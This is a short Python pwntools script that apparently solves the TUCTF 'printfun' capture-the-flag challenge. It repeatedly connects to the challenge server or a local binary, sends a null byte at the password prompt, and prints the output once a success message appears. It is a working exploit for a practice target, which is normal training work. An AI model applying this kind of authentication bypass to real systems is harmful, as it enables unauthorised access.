from pwn import *

while True:
  if "--remote" in sys.argv:
    p = remote("chal.tuctf.com", 30501)
  else:
    p = process("./printfun")

  p.sendlineafter("password?", "\x00")
  
  res = p.recvuntil("uck")

  if "Luck" in res:
    print(p.recvall())
    break
